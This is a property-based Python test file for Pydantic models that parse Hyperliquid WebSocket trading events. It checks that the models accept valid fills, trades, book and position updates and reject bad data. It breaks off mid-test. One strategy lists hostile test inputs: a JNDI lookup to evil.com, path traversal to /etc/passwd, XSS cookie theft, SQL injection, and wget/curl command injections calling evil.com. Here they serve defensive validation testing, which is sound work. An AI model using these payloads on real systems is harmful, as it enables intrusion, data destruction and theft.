"""Property-based tests for Hyperliquid raw WebSocket event models.

These tests validate critical security boundary models that process external WebSocket event data.
The models tested here are essential for real-time trading and order book updates.

SECURITY CRITICAL: These raw models protect against:
- Malicious WebSocket event data that could manipulate real-time trading decisions
- Buffer overflow attacks through oversized event structures
- Injection attacks through malformed event data and user addresses
- Type confusion that could bypass event validation
- Timestamp manipulation that could affect event ordering
- Hash manipulation that could affect event integrity
- Financial precision errors in real-time price and size data
- Order ID manipulation that could affect order tracking
- Boolean manipulation that could affect maker/taker status

Property testing ensures comprehensive coverage of WebSocket event edge cases.
"""

import string
from datetime import UTC, datetime
from decimal import Decimal
from typing import cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_orderbook import HyperliquidRawBookLevel
from cyberdelta.apis.hyperliquid.models.hl_raw_user_state import HyperliquidRawPositionInfo
from cyberdelta.apis.hyperliquid.models.hl_raw_ws_events import (
    HyperliquidRawWsBookUpdate,
    HyperliquidRawWsFillEvent,
    HyperliquidRawWsOrderUpdate,
    HyperliquidRawWsPositionUpdateEvent,
    HyperliquidRawWsTradeEvent,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError
from tests.fixtures.time_fixtures import FreezerProtocol


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================


def _create_hex_address(hex_part: str) -> str:
    """Create hexadecimal address with 0x prefix.

    Args:
        hex_part: Hexadecimal string part

    Returns:
        Address string with 0x prefix
    """
    return f"0x{hex_part}"


# =============================================================================
# HYPOTHESIS STRATEGIES FOR WEBSOCKET EVENTS MODEL TESTING
# =============================================================================


def valid_coin_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid coin symbols for WebSocket events.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Known trading pairs
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "AVAX",
            "DOGE",
            "USDC",
            "USDT",
            "ARB",
            "OP",
            "MATIC",
            "ATOM",
            "NEAR",
            "FTM",
            "ADA",
            "DOT",
            "UNI",
            "LINK",
            "AAVE",
            "CRV",
            "SUSHI",
            "1INCH",
        ]),
        # Generated symbols
        st.text(min_size=1, max_size=10, alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),
    ])


def valid_side_strategy() -> SearchStrategy[str]:
    """Generate valid trading sides.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from(["A", "B"])  # A = Ask (Sell), B = Bid (Buy)


def invalid_side_strategy() -> SearchStrategy[str]:
    """Generate invalid trading sides.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.sampled_from(["a", "b", "ask", "bid", "sell", "buy", "S", "X", "0", "1"]),
        st.text(min_size=1, max_size=20).filter(lambda x: x not in ["A", "B"]),
        st.just(""),
        st.just("   "),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Common trading values
        st.decimals(
            min_value=Decimal("0.00000001"),
            max_value=Decimal(1000000),
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Specific test values
        st.just("0.0"),
        st.just("0.1"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1000.0"),
        st.just("30000.0"),
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def invalid_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate invalid decimal strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Non-finite values
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("-Infinity"),
        # Invalid decimal formats
        st.just("1..0"),
        st.just("not-a-decimal"),
        st.just(""),
        st.just("   "),
    ])


def valid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Known valid addresses
        st.sampled_from([
            "0x1234567890abcdef1234567890abcdef12345678",
            "0xabcdef1234567890abcdef1234567890abcdef12",
            "0x742d35cc6aB26c94C2cF04E1b1F4c2eD2bF4D1C3",
            "0x0000000000000000000000000000000000000000",  # Zero address
        ]),
        # Generated valid addresses
        st.builds(
            _create_hex_address,
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def valid_cloid_strategy() -> SearchStrategy[str]:
    """Generate valid client order IDs (128-bit hex strings).

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Known valid CLOIDs
        st.sampled_from([
            "0x" + "0" * 30 + "7b",
            "0x" + "a" * 32,
            "0x" + "1" * 32,
            "0x" + "f" * 32,
        ]),
        # Generated valid CLOIDs (128-bit = 32 hex chars)
        st.builds(
            _create_hex_address,
            st.text(min_size=32, max_size=32, alphabet=string.hexdigits),
        ),
    ])


def invalid_cloid_strategy() -> SearchStrategy[str]:
    """Generate invalid client order IDs.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Wrong length
        st.text(min_size=1, max_size=31, alphabet=string.hexdigits),
        st.text(min_size=33, max_size=100, alphabet=string.hexdigits),
        # Missing 0x prefix
        st.text(min_size=32, max_size=32, alphabet=string.hexdigits),
        # Invalid characters
        st.builds(
            _create_hex_address,
            st.text(
                min_size=32,
                max_size=32,
                alphabet="ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()",
            ),
        ),
        st.just(""),
        st.just("0x"),
        st.just("short"),
    ])


def valid_timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamps (milliseconds since epoch).

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.integers(
        min_value=1000000000000,  # 2001-09-09
        max_value=2000000000000,  # 2033-05-18
    )


def invalid_timestamp_strategy() -> SearchStrategy[int]:
    """Generate invalid timestamps.

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.one_of([
        st.integers(min_value=-1000000, max_value=-1),  # Negative timestamps
        st.integers(min_value=0, max_value=999999999),  # Too small (seconds, not milliseconds)
        st.integers(min_value=9999999999999, max_value=99999999999999),  # Too large
    ])


def valid_hash_strategy() -> SearchStrategy[str]:
    """Generate valid hash strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.text(min_size=1, max_size=64, alphabet=string.hexdigits),
        st.just("abc123"),
        st.just("deadbeef"),
        st.just("0123456789abcdef"),
    ])


def valid_order_id_strategy() -> SearchStrategy[int]:
    """Generate valid order IDs.

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.integers(min_value=1, max_value=9999999999)


def valid_trade_id_strategy() -> SearchStrategy[int]:
    """Generate valid trade IDs.

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.integers(min_value=1, max_value=9999999999)


@st.composite
def valid_book_level_strategy(draw: st.DrawFn) -> dict[str, str | int]:
    """Generate valid order book level data.

    Returns:
        dict[str, str | int]: Generated test data.
    """
    return {
        "px": draw(financial_decimal_string_strategy()),
        "sz": draw(financial_decimal_string_strategy()),
        "n": draw(st.integers(min_value=1, max_value=1000)),
    }


@st.composite
def valid_book_levels_strategy(draw: st.DrawFn) -> list[list[dict[str, str | int]]]:
    """Generate valid book levels (bids and asks).

    Returns:
        list[list[dict[str, str | int]]]: Generated test data.
    """
    bids = draw(st.lists(valid_book_level_strategy(), min_size=0, max_size=10))
    asks = draw(st.lists(valid_book_level_strategy(), min_size=0, max_size=10))
    return [bids, asks]


@st.composite
def valid_position_info_strategy(
    draw: st.DrawFn,
) -> dict[str, str | dict[str, str | int] | int | None]:
    """Generate valid position info data.

    Returns:
        dict[str, str | dict[str, str | int] | int | None]: Generated test data.
    """
    return {
        "coin": draw(valid_coin_symbol_strategy()),
        "entryPx": draw(st.one_of([financial_decimal_string_strategy(), st.none()])),
        "leverage": {
            "type": draw(st.sampled_from(["cross", "isolated"])),
            "value": draw(st.integers(min_value=1, max_value=100)),
        },
        "liquidationPx": draw(st.one_of([financial_decimal_string_strategy(), st.none()])),
        "marginUsed": draw(financial_decimal_string_strategy()),
        "maxLeverage": draw(st.integers(min_value=1, max_value=100)),
        "positionValue": draw(financial_decimal_string_strategy()),
        "returnOnEquity": draw(financial_decimal_string_strategy()),
        "szi": draw(financial_decimal_string_strategy()),
        "unrealizedPnl": draw(financial_decimal_string_strategy()),
    }


@st.composite
def valid_fill_event_strategy(draw: st.DrawFn) -> dict[str, str | int | bool | None]:
    """Generate valid WebSocket fill event data.

    Returns:
        dict[str, str | int | bool | None]: Generated test data.
    """
    return {
        "coin": draw(valid_coin_symbol_strategy()),
        "px": draw(financial_decimal_string_strategy()),
        "sz": draw(financial_decimal_string_strategy()),
        "side": draw(valid_side_strategy()),
        "time": draw(valid_timestamp_strategy()),
        "hash": draw(valid_hash_strategy()),
        "oid": draw(valid_order_id_strategy()),
        "cloid": draw(st.one_of([valid_cloid_strategy(), st.none()])),
        "isMaker": draw(st.booleans()),
    }


@st.composite
def valid_book_update_strategy(
    draw: st.DrawFn,
) -> dict[str, str | int | list[list[dict[str, str | int]]]]:
    """Generate valid WebSocket book update data.

    Returns:
        dict[str, str | int | list[list[dict[str, str | int]]]]: Generated test data.
    """
    return {
        "coin": draw(valid_coin_symbol_strategy()),
        "levels": draw(valid_book_levels_strategy()),
        "time": draw(valid_timestamp_strategy()),
    }


@st.composite
def valid_trade_event_strategy(draw: st.DrawFn) -> dict[str, str | int | list[str]]:
    """Generate valid WebSocket trade event data.

    Returns:
        dict[str, str | int | list[str]]: Generated test data.
    """
    return {
        "coin": draw(valid_coin_symbol_strategy()),
        "px": draw(financial_decimal_string_strategy()),
        "sz": draw(financial_decimal_string_strategy()),
        "side": draw(valid_side_strategy()),
        "time": draw(valid_timestamp_strategy()),
        "hash": draw(valid_hash_strategy()),
        "tid": draw(valid_trade_id_strategy()),
        "users": draw(st.lists(valid_ethereum_address_strategy(), min_size=1, max_size=5)),
    }


@st.composite
def valid_order_update_strategy(draw: st.DrawFn) -> dict[str, object]:
    """Generate valid WebSocket order update data.

    Returns:
        dict[str, object]: Generated test data.
    """
    return {
        "eventType": draw(st.text(min_size=1, max_size=50)),
        "data": draw(
            st.dictionaries(
                st.text(min_size=1, max_size=20),
                st.one_of([st.text(), st.integers(), st.booleans()]),
                min_size=1,
                max_size=10,
            )
        ),
    }


@st.composite
def valid_position_update_event_strategy(
    draw: st.DrawFn,
) -> dict[str, str | int | dict[str, str | dict[str, str | int] | int | None]]:
    """Generate valid WebSocket position update event data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "asset": draw(valid_coin_symbol_strategy()),
        "position": draw(valid_position_info_strategy()),
        "time": draw(valid_timestamp_strategy()),
    }


def malicious_ws_events_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for WebSocket events security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # WebSocket event manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-ws-events}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('ws-event-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE trades;--"),
        st.just("1' UNION SELECT * FROM orders--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("W" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.trades.find(); //"),
        # JSON injection
        st.just('{"$where": "this.px > 0"}'),
        # Financial manipulation
        st.just("1000.0'; UPDATE trades SET px=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # WebSocket specific attacks
        st.just("ws://evil.com/hijack"),
        st.just("data:text/html,<script>alert(1)</script>"),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET FILL EVENT MODEL
# =============================================================================


class TestHyperliquidRawWsFillEventProperties:
    """Property-based tests for HyperliquidRawWsFillEvent validation and security."""

    @given(fill_data=valid_fill_event_strategy())
    def test_fill_event_validation_success_properties(
        self, fill_data: dict[str, str | int | bool | None]
    ) -> None:
        """Property: Valid fill event data should create valid objects."""
        # Skip invalid data
        try:
            # Validate basic structure
            assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
            assume(isinstance(fill_data["side"], str) and fill_data["side"] in ["A", "B"])
            assume(isinstance(fill_data["time"], int) and fill_data["time"] > 0)
            assume(isinstance(fill_data["oid"], int) and fill_data["oid"] > 0)

            # Validate decimal fields
            for field in ["px", "sz"]:
                value = fill_data[field]
                assume(isinstance(value, str) and value.strip())
                # Type narrowing for mypy
                assert isinstance(value, str)
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite() and decimal_val > 0)

            # Validate optional cloid
            if fill_data.get("cloid") is not None:
                cloid = fill_data["cloid"]
                assume(isinstance(cloid, str) and len(cloid) == 34)  # 0x + 32 hex chars
                # Type narrowing for mypy
                assert isinstance(cloid, str)
                assume(cloid.startswith("0x"))

        except (ValueError, TypeError, KeyError, IndexError):
            assume(False)

        obj = HyperliquidRawWsFillEvent.model_validate(fill_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawWsFillEvent)

        # Property: All fields should be preserved with correct types
        assert obj.coin == fill_data["coin"]
        assert isinstance(obj.px, str)
        assert isinstance(obj.sz, str)
        assert obj.side == fill_data["side"]
        assert obj.time == fill_data["time"]
        assert obj.hash == fill_data["hash"]
        assert obj.oid == fill_data["oid"]
        assert obj.is_maker == fill_data["isMaker"]

        if fill_data.get("cloid") is not None:
            assert obj.cloid == fill_data["cloid"]
        else:
            assert obj.cloid is None

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["coin", "px", "sz", "side", "hash", "cloid"]),
        malicious_value=malicious_ws_events_strategy(),
    )
    def test_fill_event_security_boundary_properties(
        self,
        field_name: str,
        malicious_value: MaliciousInput,
    ) -> None:
        """Property: Fill event model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "coin": "ETH",
            "px": "3000.0",
            "sz": "1.5",
            "side": "B",
            "time": 1640995200000,
            "hash": "abc123",
            "oid": 42,
            "cloid": "0x" + "0" * 30 + "7b",
            "isMaker": True,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawWsFillEvent.model_validate(base_data)

    @given(invalid_side=invalid_side_strategy())
    def test_fill_event_invalid_side_properties(self, invalid_side: str) -> None:
        """Property: Fill event should reject invalid trading sides."""
        fill_data = {
            "coin": "ETH",
            "px": "3000.0",
            "sz": "1.5",
            "side": invalid_side,
            "time": 1640995200000,
            "hash": "abc123",
            "oid": 42,
            "isMaker": True,
        }

        # Property: Invalid sides should be rejected
        with pytest.raises((ValidationError, EmptyStringError)):
            HyperliquidRawWsFillEvent.model_validate(fill_data)

    @given(invalid_cloid=invalid_cloid_strategy())
    def test_fill_event_invalid_cloid_properties(self, invalid_cloid: str) -> None:
        """Property: Fill event should reject invalid client order IDs."""
        fill_data = {
            "coin": "ETH",
            "px": "3000.0",
            "sz": "1.5",
            "side": "B",
            "time": 1640995200000,
            "hash": "abc123",
            "oid": 42,
            "cloid": invalid_cloid,
            "isMaker": True,
        }

        # Property: Invalid CLOIDs should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawWsFillEvent.model_validate(fill_data)

    @given(
        decimal_field=st.sampled_from(["px", "sz"]),
        invalid_decimal=invalid_decimal_string_strategy(),
    )
    def test_fill_event_invalid_decimal_properties(
        self, decimal_field: str, invalid_decimal: str
    ) -> None:
        """Property: Fill event should reject invalid decimal values."""
        fill_data = {
            "coin": "ETH",
            "px": "3000.0",
            "sz": "1.5",
            "side": "B",
            "time": 1640995200000,
            "hash": "abc123",
            "oid": 42,
            "isMaker": True,
        }
        fill_data[decimal_field] = invalid_decimal

        # Property: Invalid decimal values should be rejected
        with pytest.raises((ValidationError, EmptyStringError)):
            HyperliquidRawWsFillEvent.model_validate(fill_data)

    @given(invalid_timestamp=invalid_timestamp_strategy())
    def test_fill_event_invalid_timestamp_properties(self, invalid_timestamp: int) -> None:
        """Property: Fill event should reject invalid timestamps."""
        fill_data = {
            "coin": "ETH",
            "px": "3000.0",
            "sz": "1.5",
            "side": "B",
            "time": invalid_timestamp,
            "hash": "abc123",
            "oid": 42,
            "isMaker": True,
        }

        # Property: Invalid timestamps should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawWsFillEvent.model_validate(fill_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET BOOK UPDATE MODEL
# =============================================================================


class TestHyperliquidRawWsBookUpdateProperties:
    """Property-based tests for HyperliquidRawWsBookUpdate validation and security."""

    @given(book_data=valid_book_update_strategy())
    def test_book_update_validation_success_properties(
        self, book_data: dict[str, str | int | list[list[dict[str, str | int]]]]
    ) -> None:
        """Property: Valid book update data should create valid objects."""
        # Skip invalid data
        try:
            assume(isinstance(book_data["coin"], str) and book_data["coin"].strip())
            assume(isinstance(book_data["time"], int) and book_data["time"] > 0)
            assume(isinstance(book_data["levels"], list) and len(book_data["levels"]) == 2)

            # Validate book levels structure
            levels = book_data["levels"]
            # Type narrowing for mypy
            assert isinstance(levels, list)
            for side_levels in levels:
                # Type narrowing for mypy
                assert isinstance(side_levels, list)
                for level in side_levels:
                    # Type narrowing for mypy
                    assert isinstance(level, dict)
                    for field in ["px", "sz"]:
                        if field in level:
                            value = level[field]
                            assume(isinstance(value, str) and value.strip())
                            decimal_val = Decimal(value)
                            assume(decimal_val.is_finite() and decimal_val > 0)

        except (ValueError, TypeError, KeyError, IndexError):
            assume(False)

        obj = HyperliquidRawWsBookUpdate.model_validate(book_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawWsBookUpdate)

        # Property: All fields should be preserved with correct types
        assert obj.coin == book_data["coin"]
        assert obj.time == book_data["time"]
        assert isinstance(obj.levels, list)
        assert len(obj.levels) == 2

    @given(
        field_name=st.sampled_from(["coin"]),
        malicious_value=malicious_ws_events_strategy(),
    )
    def test_book_update_security_boundary_properties(
        self,
        field_name: str,
        malicious_value: MaliciousInput,
    ) -> None:
        """Property: Book update model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "coin": "BTC",
            "levels": [[], []],
            "time": 1640995200000,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawWsBookUpdate.model_validate(base_data)

    @given(
        levels_structure=st.one_of([
            st.lists(
                st.lists(st.dictionaries(st.text(), st.text())), min_size=1, max_size=1
            ),  # Wrong size
            st.lists(
                st.lists(st.dictionaries(st.text(), st.text())), min_size=3, max_size=5
            ),  # Wrong size
            st.just([]),  # Empty
            st.integers(),  # Wrong type
            st.text(),  # Wrong type
        ])
    )
    def test_book_update_invalid_levels_structure_properties(
        self, levels_structure: list[list[dict[str, str]]] | list[object] | int | str
    ) -> None:
        """Property: Book update should reject invalid levels structure."""
        book_data = {
            "coin": "BTC",
            "levels": levels_structure,
            "time": 1640995200000,
        }

        # Property: Invalid levels structure should be rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawWsBookUpdate.model_validate(book_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET TRADE EVENT MODEL
# =============================================================================


class TestHyperliquidRawWsTradeEventProperties:
    """Property-based tests for HyperliquidRawWsTradeEvent validation and security."""

    @given(trade_data=valid_trade_event_strategy())
    def test_trade_event_validation_success_properties(
        self, trade_data: dict[str, str | int | list[str]]
    ) -> None:
        """Property: Valid trade event data should create valid objects."""
        # Skip invalid data
        try:
            assume(isinstance(trade_data["coin"], str) and trade_data["coin"].strip())
            assume(isinstance(trade_data["side"], str) and trade_data["side"] in ["A", "B"])
            assume(isinstance(trade_data["time"], int) and trade_data["time"] > 0)
            assume(isinstance(trade_data["tid"], int) and trade_data["tid"] > 0)
            assume(isinstance(trade_data["users"], list) and len(trade_data["users"]) > 0)

            # Validate decimal fields
            for field in ["px", "sz"]:
                value = trade_data[field]
                assume(isinstance(value, str) and value.strip())
                # Type narrowing for mypy
                assert isinstance(value, str)
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite() and decimal_val > 0)

            # Validate user addresses
            users = trade_data["users"]
            # Type narrowing for mypy
            assert isinstance(users, list)
            for user in users:
                assume(isinstance(user, str) and len(user) == 42)
                assume(user.startswith("0x"))

        except (ValueError, TypeError, KeyError, IndexError):
            assume(False)

        obj = HyperliquidRawWsTradeEvent.model_validate(trade_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawWsTradeEvent)

        # Property: All fields should be preserved with correct types
        assert obj.coin == trade_data["coin"]
        assert isinstance(obj.px, str)
        assert isinstance(obj.sz, str)
        assert obj.side == trade_data["side"]
        assert obj.time == trade_data["time"]
        assert obj.hash == trade_data["hash"]
        assert obj.tid == trade_data["tid"]
        assert isinstance(obj.users, list)

    @given(
        field_name=st.sampled_from(["coin", "px", "sz", "side", "hash"]),
        malicious_value=malicious_ws_events_strategy(),
    )
    def test_trade_event_security_boundary_properties(
        self,
        field_name: str,
        malicious_value: MaliciousInput,
    ) -> None:
        """Property: Trade event model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "coin": "ETH",
            "px": "3000.0",
            "sz": "1.5",
            "side": "A",
            "time": 1640995200000,
            "hash": "abc123",
            "tid": 12345,
            "users": ["0x1234567890abcdef1234567890abcdef12345678"],
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawWsTradeEvent.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET ORDER UPDATE MODEL
# =============================================================================


class TestHyperliquidRawWsOrderUpdateProperties:
    """Property-based tests for HyperliquidRawWsOrderUpdate validation and security."""

    @given(order_data=valid_order_update_strategy())
    def test_order_update_validation_success_properties(
        self, order_data: dict[str, str | dict[str, str | int | bool]]
    ) -> None:
        """Property: Valid order update data should create valid objects."""
        # Skip invalid data
        try:
            assume(isinstance(order_data["eventType"], str) and order_data["eventType"].strip())
            assume(isinstance(order_data["data"], dict) and len(order_data["data"]) > 0)
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawWsOrderUpdate.model_validate(order_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawWsOrderUpdate)

        # Property: All fields should be preserved with correct types
        assert obj.event_type == order_data["eventType"]
        assert isinstance(obj.data, dict)

    @given(
        field_name=st.sampled_from(["eventType", "data"]),
        malicious_value=malicious_ws_events_strategy(),
    )
    def test_order_update_security_boundary_properties(
        self,
        field_name: str,
        malicious_value: MaliciousInput,
    ) -> None:
        """Property: Order update model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "eventType": "orderUpdate",
            "data": {"foo": "bar"},
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawWsOrderUpdate.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET POSITION UPDATE EVENT MODEL
# =============================================================================


class TestHyperliquidRawWsPositionUpdateEventProperties:
    """Property-based tests for HyperliquidRawWsPositionUpdateEvent validation and security."""

    @given(position_data=valid_position_update_event_strategy())
    def test_position_update_event_validation_success_properties(
        self,
        position_data: dict[str, str | int | dict[str, str | dict[str, str | int] | int | None]],
    ) -> None:
        """Property: Valid position update data should create valid objects."""
        # Skip invalid data
        try:
            assume(isinstance(position_data["asset"], str) and position_data["asset"].strip())
            assume(isinstance(position_data["time"], int) and position_data["time"] > 0)
            assume(isinstance(position_data["position"], dict))

            # Validate position data structure
            position = position_data["position"]
            # Type narrowing for mypy
            assert isinstance(position, dict)
            assume(isinstance(position["coin"], str) and position["coin"].strip())
            assume(isinstance(position["leverage"], dict))

            # Validate decimal fields in position
            for field in ["marginUsed", "positionValue", "returnOnEquity", "szi", "unrealizedPnl"]:
                if field in position:
                    value = position[field]
                    assume(isinstance(value, str) and value.strip())
                    # Type narrowing for mypy
                    assert isinstance(value, str)
                    decimal_val = Decimal(value)
                    assume(decimal_val.is_finite())

        except (ValueError, TypeError, KeyError, IndexError):
            assume(False)

        obj = HyperliquidRawWsPositionUpdateEvent.model_validate(position_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawWsPositionUpdateEvent)

        # Property: All fields should be preserved with correct types
        assert obj.asset == position_data["asset"]
        assert obj.time == position_data["time"]
        assert isinstance(obj.position, HyperliquidRawPositionInfo)

    @given(
        field_name=st.sampled_from(["asset"]),
        malicious_value=malicious_ws_events_strategy(),
    )
    def test_position_update_event_security_boundary_properties(
        self,
        field_name: str,
        malicious_value: MaliciousInput,
    ) -> None:
        """Property: Position update event model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "asset": "ETH",
            "position": {
                "coin": "ETH",
                "leverage": {"type": "cross", "value": 10},
                "marginUsed": "100.0",
                "maxLeverage": 50,
                "positionValue": "150.0",
                "returnOnEquity": "0.1",
                "szi": "1.5",
                "unrealizedPnl": "10.0",
            },
            "time": 1640995200000,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawWsPositionUpdateEvent.model_validate(base_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawWsEventsIntegrationProperties:
    """Integration property tests for WebSocket event models working together."""

    @given(
        events=st.lists(
            st.one_of([
                valid_fill_event_strategy(),
                valid_trade_event_strategy(),
                valid_order_update_strategy(),
            ]),
            min_size=2,
            max_size=5,
        ),
        malicious_value=malicious_ws_events_strategy(),
    )
    def test_ws_events_batch_processing_properties(
        self,
        events: list[dict[str, str | int | bool | list[str] | dict[str, str | int | bool] | None]],
        malicious_value: object,
    ) -> None:
        """Property: Multiple WebSocket events should be processed independently."""
        valid_events: list[
            HyperliquidRawWsFillEvent | HyperliquidRawWsTradeEvent | HyperliquidRawWsOrderUpdate
        ] = []

        for event_data in events:
            # Try to validate each event type
            try:
                if "isMaker" in event_data:  # Fill event
                    if self._is_valid_fill_event(cast(dict[str, object], event_data)):
                        fill_event = HyperliquidRawWsFillEvent.model_validate(event_data)
                        valid_events.append(fill_event)
                elif "tid" in event_data:  # Trade event
                    if self._is_valid_trade_event(cast(dict[str, object], event_data)):
                        trade_event = HyperliquidRawWsTradeEvent.model_validate(event_data)
                        valid_events.append(trade_event)
                elif "eventType" in event_data and self._is_valid_order_update(
                    cast(dict[str, object], event_data)
                ):
                    order_event = HyperliquidRawWsOrderUpdate.model_validate(event_data)
                    valid_events.append(order_event)
            except (ValidationError, TypeError, KeyError):
                continue

        # Property: Each event should maintain its individual values
        for event in valid_events:
            assert hasattr(event, "model_config")

        # Property: Malicious value should be rejected when injected
        if valid_events:
            corrupted_data = {"coin": malicious_value}
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawWsFillEvent.model_validate(corrupted_data)

    def _is_valid_fill_event(self, data: dict[str, object]) -> bool:
        """Check if data represents a valid fill event.

        Returns:
            bool: True if data represents a valid fill event, False otherwise.
        """
        try:
            required_fields = ["coin", "px", "sz", "side", "time", "hash", "oid", "isMaker"]
            if not all(field in data for field in required_fields):
                return False
            if data["side"] not in ["A", "B"]:
                return False
            return isinstance(data["time"], int) and data["time"] > 0
        except (TypeError, KeyError):
            return False

    def _is_valid_trade_event(self, data: dict[str, object]) -> bool:
        """Check if data represents a valid trade event.

        Returns:
            bool: True if data represents a valid trade event, False otherwise.
        """
        try:
            required_fields = ["coin", "px", "sz", "side", "time", "hash", "tid", "users"]
            if not all(field in data for field in required_fields):
                return False
            if data["side"] not in ["A", "B"]:
                return False
            users = data["users"]
            return isinstance(users, list) and len(users) > 0
        except (TypeError, KeyError):
            return False

    def _is_valid_order_update(self, data: dict[str, object]) -> bool:
        """Check if data represents a valid order update.

        Returns:
            bool: True if data represents a valid order update, False otherwise.
        """
        try:
            if "eventType" not in data or "data" not in data:
                return False
            data_dict = data["data"]
            return isinstance(data_dict, dict) and len(data_dict) > 0
        except (TypeError, KeyError):
            return False


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_ws_fill_event_happy_path(freezer: FreezerProtocol) -> None:
    """Test ws fill event happy path."""
    freezer.move_to("2025-01-15 12:00:00")
    # Use the frozen time for the timestamp
    frozen_time_ms = int(datetime.now(UTC).timestamp() * 1000)
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
